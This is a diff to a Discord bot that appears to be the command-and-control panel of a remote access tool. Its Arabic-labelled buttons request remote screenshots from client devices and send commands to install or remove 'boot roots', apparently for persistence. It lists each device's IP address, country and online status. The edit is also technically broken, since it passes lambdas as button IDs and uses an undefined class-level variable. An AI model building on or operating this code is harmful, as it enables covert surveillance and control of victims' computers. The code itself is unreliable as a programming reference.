@@ -420,13 +420,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_screenshots", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
 
-    @discord.ui.button(label="🌱 تثبيت جذور الملف", style=discord.ButtonStyle.success, custom_id="root_inst_", row=2)
-    async def root_install_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        # تم تعديل الـ custom_id ليكون مطابقاً للكود البرمجي
-        pass
-
-    # سنقوم بإنشاء الأزرار بشكل مستقل ونظيف
-    @discord.ui.button(label="🌱 تثبيت جذور الإقلاع", style=discord.ButtonStyle.success, custom_id=f"root_inst_{code}", row=2)
+    @discord.ui.button(label="🌱 تثبيت جذور الإقلاع", style=discord.ButtonStyle.success, custom_id=lambda s=code: f"root_inst_{s}", row=2)
     async def root_install_action(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -435,7 +429,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Install root {self.code}"):
                 await interaction.followup.send("🌱 تم إرسال أمر تثبيت جذور الإقلاع للعميل بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="🗑️ حذف جذور الإقلاع", style=discord.ButtonStyle.danger, custom_id=f"root_rem_{code}", row=2)
+    @discord.ui.button(label="🗑️ حذف جذور الإقلاع", style=discord.ButtonStyle.danger, custom_id=lambda s=code: f"root_rem_{s}", row=2)
     async def root_remove_action(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -489,7 +483,6 @@ class DeviceManageButton(discord.ui.Button):
         ip = info.get("ip", "Unknown")
         country = info.get("country", "Unknown")
         last_seen = info.get("last_seen", 0)
-        # تم ضبط الفارق الزمني ليكون دقيقاً (20 ثانية) لمعرفة حالة الاتصال الحقيقية
         is_online = (time.time() - last_seen) < 20
         status_icon = "🟢" if is_online else "🔴"
         super().__init__(label=f"{status_icon} {ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
